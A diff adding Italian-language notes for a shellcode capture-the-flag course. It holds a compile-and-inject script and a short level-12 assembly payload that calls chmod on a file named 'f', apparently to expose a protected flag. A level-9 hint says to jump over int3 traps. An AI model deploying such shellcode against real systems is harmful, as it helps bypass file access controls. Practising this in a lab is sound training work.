@@ -18,7 +18,21 @@ Syscall <--- (*)
   
 Aggiungere nop all'inizio se serve
 
+------- script.sh ----------
 
 gcc -nostdlib -o program program.s
 objcopy --dump-section .text=program_binary program
 /challenge/run < program_binary
+
+---------------------------------
+° LVL 12:
+push 0x66
+mov rdi, rsp
+xor esi, esi
+add esi, 4
+mov al, 0x5a
+syscall
+
+°LVL 9
+Guardare i byte!
+saltare le int3 con dei jump
